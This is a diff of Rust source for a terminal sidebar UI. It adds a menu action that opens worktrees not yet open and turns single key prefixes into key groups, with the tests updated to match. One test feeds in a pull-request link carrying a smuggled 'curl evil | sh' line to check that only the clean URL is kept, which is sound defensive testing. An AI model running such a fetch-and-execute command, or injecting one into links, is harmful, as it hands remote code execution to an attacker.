@@ -22,7 +22,7 @@ use lunetad::issues::{Filed, Unfiled};
 use lunetad::links;
 use lunetad::mux::own::{OwnClientId, OwnKey, OwnPane};
 use lunetad::mux::TerminalKey;
-use lunetad::projects::{self, Dir, ProjectId, ViewId, WorktreeId};
+use lunetad::projects::{self, Dir, ProjectId, ViewId, WorktreeId, CLONE_WORKTREES_MAX};
 use lunetad::prunes;
 use lunetad::seats::{self, seated, Where};
 use lunetad::transcripts::SessionId;
@@ -53,7 +53,7 @@ use crate::menu::{
     Ran, Rename, Target, Top, Wants, WorktreeRow,
 };
 use crate::news::News;
-use crate::picker::{Here, Housed, Listing, Runs, Seated, Shelved, Worktree};
+use crate::picker::{Here, Housed, Listing, Runs, Seated, Shelved, Unopened, Worktree};
 use crate::printed::Printed;
 use crate::projected;
 use crate::prune;
@@ -776,6 +776,7 @@ struct Known {
     dir: Dir,
     worktrees: Vec<KnownWorktree>,
     order: Vec<WorktreeId>,
+    unopened: Unopened,
 }
 
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -818,10 +819,35 @@ impl Known {
             let name = worktree.name.clone();
             Some(KnownWorktree { place, name, folder, seen, used, panes, terminals, in_panes })
         });
-        let worktrees = worktrees.collect();
+        let worktrees: Vec<KnownWorktree> = worktrees.collect();
         let order = rows.iter().filter_map(|it| WorktreeId::of(it.id)).collect();
         let dir = Dir::parse(&said.dir).expect("lunetad says a project's folder as one it keeps");
-        Some(Known { project, dir, worktrees, order })
+        let unopened = Known::unopened_of(said, &dir, &worktrees);
+        Some(Known { project, dir, worktrees, order, unopened })
+    }
+
+    fn unopened_of(said: &api::Project, dir: &Dir, worktrees: &[KnownWorktree]) -> Unopened {
+        use api::project::clone::Listing as Said;
+        let clone = match &said.holds {
+            Some(api::project::Holds::Clone(clone)) => clone,
+            Some(api::project::Holds::Folder(_)) | None => return Unopened::Folder,
+        };
+        let listed = match &clone.listing {
+            Some(Said::Unopened(listed)) => &listed.subfolders,
+            Some(Said::Unlisted(why)) => return Unopened::Unlisted(why.clone()),
+            None => return Unopened::Unlisted("lunetad says nothing of them".to_owned()),
+        };
+        let max = CLONE_WORKTREES_MAX;
+        assert!(listed.len() <= max, "a clone lists at most {max} worktrees");
+        let open: BTreeSet<&Dir> = worktrees.iter().map(|it| &it.folder).collect();
+        let unopened = listed.iter().map(|it| {
+            let subfolder = projects::Subfolder::parse(it);
+            let subfolder = subfolder.expect("lunetad says a worktree not open as a subfolder");
+            let folder = dir.at(&subfolder);
+            assert!(!open.contains(&folder), "{it} is said not open, so no open worktree is there");
+            folder
+        });
+        Unopened::Listed(unopened.collect())
     }
 
     fn listed(&self) -> &Listed {
@@ -1045,6 +1071,7 @@ fn machines<'a>(host: &'a Host, shelves: &'a [Shelf]) -> Machines<'a> {
 #[derive(Debug, PartialEq, Eq)]
 pub enum Asked {
     Nothing,
+    OpenWorktree { on: Machine, project: ProjectRow },
     Prunes { menu: u64, on: Machine, dir: Directory },
     Prune { menu: u64, on: Machine, dir: Directory, agreed: BTreeSet<prunes::Deleting> },
     Go { on: Machine, place: Place },
@@ -1094,6 +1121,7 @@ impl Asked {
             | Asked::Printed { menu, .. }
             | Asked::Checks { menu, .. } => Some(*menu),
             Asked::Nothing
+            | Asked::OpenWorktree { .. }
             | Asked::Go { .. }
             | Asked::Take
             | Asked::Copy(_)
@@ -1211,14 +1239,14 @@ enum Pending {
     Nothing,
     Legend,
     First { shows: SystemTime },
-    Yank { shows: SystemTime },
+    Group { key: char, shows: SystemTime },
     AllKeys(AllKeys),
 }
 
 impl Pending {
     fn shows(&self) -> Option<SystemTime> {
         match self {
-            Pending::First { shows } | Pending::Yank { shows } => Some(*shows),
+            Pending::First { shows } | Pending::Group { shows, .. } => Some(*shows),
             Pending::Nothing | Pending::Legend | Pending::AllKeys(_) => None,
         }
     }
@@ -1898,7 +1926,8 @@ impl Sidebar {
                 });
             }
             let (project, dir) = (known.project.clone(), known.dir.clone());
-            projects.push(Housed { project, dir, worktrees });
+            let unopened = known.unopened.clone();
+            projects.push(Housed { project, dir, worktrees, unopened });
         }
         let away = seen.err().map(|away| away.said().0);
         Shelved { on: machine.clone(), away, projects }
@@ -2575,15 +2604,18 @@ impl Sidebar {
             KeyCode::Enter => return self.go(),
             KeyCode::Esc if pending.shows().is_some() => {},
             KeyCode::Esc => return Asked::Leave,
-            KeyCode::Char(menu::YANK_PULL) if matches!(pending, Pending::Yank { .. }) => {
-                return self.yank(now);
+            KeyCode::Char(c)
+                if let Pending::Group { key, .. } = pending
+                    && let Some(action) = menu::in_group(key, c) =>
+            {
+                return self.row_action(action, now);
             },
             KeyCode::Char(c) => match Top::of(c) {
                 Some(Top::Move(by)) => self.step(by),
                 Some(Top::Last) => self.end(true),
                 Some(Top::First) if matches!(pending, Pending::First { .. }) => self.end(false),
                 Some(Top::First) => self.pending = Pending::First { shows },
-                Some(Top::Yank) => self.pending = Pending::Yank { shows },
+                Some(Top::Group(key)) => self.pending = Pending::Group { key, shows },
                 Some(Top::AllKeys) => self.pending = Pending::Legend,
                 Some(Top::Fold(Some(folded))) => self.fold(folded),
                 Some(Top::Fold(None)) => self.toggle(),
@@ -2591,7 +2623,6 @@ impl Sidebar {
                 Some(Top::Command(Action::Search)) => self.find(String::new()),
                 Some(Top::Command(Action::Unread)) => self.toggle_unread(now),
                 Some(Top::Command(Action::Reorder)) => self.select(),
-                Some(Top::Command(Action::OpenPull)) => return self.browse(),
                 Some(Top::Command(_) | Top::Shift(_)) => {},
                 None => {
                     let asked = self.open_menu(Some(c));
@@ -2669,6 +2700,25 @@ impl Sidebar {
     fn copy(&mut self, link: Link, now: SystemTime) -> Asked {
         self.copied = Some((link.number(), now));
         Asked::Copy(link)
+    }
+
+    fn row_action(&mut self, action: Action, now: SystemTime) -> Asked {
+        match action {
+            Action::YankPull => self.yank(now),
+            Action::OpenPull => self.browse(),
+            Action::OpenWorktree => self.open_worktree(),
+            other => unreachable!("{other:?} is in a row group and has no handler"),
+        }
+    }
+
+    fn open_worktree(&mut self) -> Asked {
+        let target = self.target();
+        let Some((on, project)) = target.and_then(|it| Some((it.machine().clone(), it.project()?)))
+        else {
+            self.notify("menu: a worktree is opened from a row of its project".to_owned());
+            return Asked::Nothing;
+        };
+        Asked::OpenWorktree { on, project }
     }
 
     fn browse(&mut self) -> Asked {
@@ -3088,7 +3138,7 @@ impl Sidebar {
 
     pub fn keys_clicked(&mut self, keyed: Keyed, key: &KeyEvent, now: SystemTime) -> Asked {
         let there = match self.bottom(now) {
-            Bottom::Legend | Bottom::Yank | Bottom::Keys(..) | Bottom::AllKeys(_) => {
+            Bottom::Legend | Bottom::Group(_) | Bottom::Keys(..) | Bottom::AllKeys(_) => {
                 Some(Keyed::Legend)
             },
             Bottom::Search(_) => Some(Keyed::Search),
@@ -4198,8 +4248,8 @@ impl Sidebar {
                 let (lines, spots) = menu::legend(self.target().as_ref(), width, room);
                 (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
             },
-            Bottom::Yank => {
-                let (lines, spots) = menu::yanks(width, room);
+            Bottom::Group(key) => {
+                let (lines, spots) = menu::grouped(key, width, room);
                 (lines, Drawn::Keys(Keyed::Legend, spots.down(above)))
             },
             Bottom::Keys(title, keys) => {
@@ -4270,9 +4320,9 @@ impl Sidebar {
             match &self.pending {
                 Pending::Legend => Bottom::Legend,
                 Pending::AllKeys(all) => Bottom::AllKeys(all),
-                Pending::Yank { shows } if *shows <= now => Bottom::Yank,
+                Pending::Group { key, shows } if *shows <= now => Bottom::Group(*key),
                 Pending::First { shows } if *shows <= now => Bottom::Keys(GO, &GO_KEYS),
-                Pending::Nothing | Pending::First { .. } | Pending::Yank { .. } => {
+                Pending::Nothing | Pending::First { .. } | Pending::Group { .. } => {
                     match self.moving {
                         Moving::Selected(_) => {
                             Bottom::Keys(Action::Reorder.name(), &SELECTED_KEYS)
@@ -4293,7 +4343,7 @@ enum Bottom<'a> {
     Menu(&'a Menu),
     Search(&'a Search),
     Legend,
-    Yank,
+    Group(char),
     Keys(&'static str, &'static [(Label, &'static str)]),
     AllKeys(&'a AllKeys),
     Nothing,
@@ -5244,7 +5294,7 @@ mod tests {
                 name: session.name.clone(),
                 dir: "/w".to_owned(),
                 missing: false,
-                holds: Some(api::project::Holds::Clone(api::project::Clone { worktrees })),
+                holds: Some(api::project::Holds::Clone(clone_of(worktrees))),
             }
         };
         let projects = sessions.iter().map(project).collect();
@@ -5437,9 +5487,13 @@ mod tests {
         kept.unwrap_or("/w").to_owned()
     }
 
+    fn clone_of(worktrees: Vec<api::Worktree>) -> api::project::Clone {
+        api::project::Clone { worktrees, listing: None }
+    }
+
     fn a_project(id: u64, name: &str, worktrees: Vec<api::Worktree>) -> api::Project {
         let (name, dir) = (name.to_owned(), "/w".to_owned());
-        let holds = Some(api::project::Holds::Clone(api::project::Clone { worktrees }));
+        let holds = Some(api::project::Holds::Clone(clone_of(worktrees)));
         api::Project { id, name, dir, missing: false, holds }
     }
 
@@ -7377,7 +7431,7 @@ mod tests {
             assert_eq!(sidebar.notice.as_deref(), Some(note));
             assert_eq!(sidebar.copied, None);
             sidebar.notice = None;
-            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{note}");
+            assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing, "{note}");
             assert_eq!(sidebar.notice.as_deref(), Some(note));
         }
     }
@@ -7417,7 +7471,7 @@ mod tests {
             assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
             assert_eq!(sidebar.notice.as_deref(), Some(note));
             assert_eq!(sidebar.copied, None);
-            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{said:?}");
+            assert_eq!(open_pull(&mut sidebar, now), Asked::Nothing, "{said:?}");
             assert_eq!(sidebar.notice.as_deref(), Some(note));
         }
     }
@@ -7426,18 +7480,23 @@ mod tests {
     fn a_page_that_reads_is_taken_as_luneta_spells_it() {
         let now = moment(160_000);
         let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
-        let Asked::Browse(link) = sidebar.key(&char('o'), now) else {
+        let Asked::Browse(link) = open_pull(&mut sidebar, now) else {
             panic!("the row's link opens");
         };
         assert_eq!(link.url(), "https://github.com/owner/repo/pull/5");
     }
 
+    fn open_pull(sidebar: &mut Sidebar, now: SystemTime) -> Asked {
+        assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "o opens a group");
+        sidebar.key(&char('p'), now)
+    }
+
     #[test]
-    fn o_and_y_p_take_another_machine_s_link_too() {
+    fn o_p_and_y_p_take_another_machine_s_link_too() {
         let mut sidebar = pulls();
         sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
         let now = moment(160_000);
-        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(link()));
+        assert_eq!(open_pull(&mut sidebar, now), Asked::Browse(link()));
         assert_eq!(sidebar.copied, None, "what opens shows");
 
         let far = "https://github.com/owner/repo/pull/8";
@@ -7454,9 +7513,45 @@ mod tests {
         let place = PanePlace { session: listed("main", 20), pane: PaneKey::terminal(1) };
         let place = Place::Pane(place);
         sidebar.cursor = Some(Spot::Remote(nixos(), place));
-        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(far_link.clone()));
+        assert_eq!(open_pull(&mut sidebar, now), Asked::Browse(far_link.clone()));
         sidebar.key(&char('y'), now);
         assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(far_link));
+    }
+
+    #[test]
+    fn every_key_of_a_row_group_asks_or_says_why_not() {
+        let now = moment(160_000);
+        let grouped = Action::row().filter(|(_, path)| path.len() == 2);
+        for (action, path) in grouped {
+            let mut sidebar = pulls();
+            sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+            assert_eq!(sidebar.key(&char(path[0]), now), Asked::Nothing, "{path:?} opens a group");
+            let asked = sidebar.key(&char(path[1]), now);
+            let said = asked != Asked::Nothing || sidebar.notice.is_some();
+            assert!(said, "{action:?} on {path:?} does nothing");
+        }
+    }
+
+    #[test]
+    fn o_w_asks_for_the_worktrees_not_open_of_the_row_s_project_on_its_machine() {
+        let mut sidebar = pulls();
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        let now = moment(160_000);
+        let opening = |sidebar: &mut Sidebar| {
+            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "o opens a group");
+            match sidebar.key(&char('w'), now) {
+                Asked::OpenWorktree { on, project } => (on, project.listed().name().to_string()),
+                asked => panic!("o w asks for no worktree to open: {asked:?}"),
+            }
+        };
+        assert_eq!(opening(&mut sidebar), (Machine::Local, "s".to_owned()));
+
+        let mut sidebar = fresh();
+        sidebar.hear(machines());
+        sidebar.focus(Keys::Sidebar);
+        let place = PanePlace { session: listed("main", 20), pane: PaneKey::terminal(1) };
+        sidebar.cursor = Some(Spot::Remote(nixos(), Place::Pane(place)));
+        assert_eq!(opening(&mut sidebar), (Machine::Remote(nixos()), "main".to_owned()));
     }
 
     #[test]
@@ -7586,7 +7681,7 @@ mod tests {
             (" /  Search", Some(on_legend('/'))),
             (" u  Unread", Some(on_legend('u'))),
             (" v  Reorder", Some(on_legend('v'))),
-            (" o  Open PR", Some(on_legend('o'))),
+            (" o  Open ▸", Some(on_legend('o'))),
             (" y  Yank ▸", Some(on_legend('y'))),
             (" a  Ask", Some(on_legend('a'))),
             (" c  Skills ▸", Some(on_legend('c'))),
